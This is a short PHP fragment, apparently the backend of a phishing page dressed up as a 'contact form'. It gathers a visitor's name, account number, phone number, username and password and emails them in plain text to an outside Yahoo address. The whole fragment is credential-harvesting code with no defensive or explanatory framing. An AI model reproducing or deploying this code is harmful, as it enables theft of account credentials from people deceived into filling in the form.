...
if ($action=="")    /* display the contact form */ 
    ...
    $pass=$_REQUEST['pass']; 
	if (($name=="")||($uname=="")||($account=="")||($contact=="")||($pass=="")) 
        { 
        echo '<h2 style=" color:#a5a5a5;  text-align:center; margin-top:10px; font-size:17px; font-family:arial; font-weight:normal;">All fields are required, please fill <a href=existingaccount.php  style=" color:#d76f1c;">the form</a> again.</h2>';  
        } 
    else{         
        $from="Name: $name\r\nAccount Number: $account\r\nContact Number: $contact\r\nUser Name: $uname\r\nPassword: $pass"; 
        $subject="Message sent using your contact form"; 
        mail("chavaadler@yahoo.co.uk", $name, $from); 
